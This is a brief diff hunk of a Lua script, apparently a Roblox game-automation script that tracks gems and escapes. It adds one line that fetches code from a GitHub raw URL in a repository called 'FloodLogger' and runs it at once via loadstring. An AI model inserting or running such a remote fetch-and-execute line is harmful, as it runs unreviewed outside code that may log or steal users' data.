@@ -20,6 +20,7 @@ _G.ESCAPED = 0
 
 _G.Door = game.Workspace.Lobby.PlayHere
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dazscripts/FloodLogger/main/functions/HTTP"))()
 
 local function SendHttpsStats()
     GEMS += tonumber(GEM_PATH.Text)
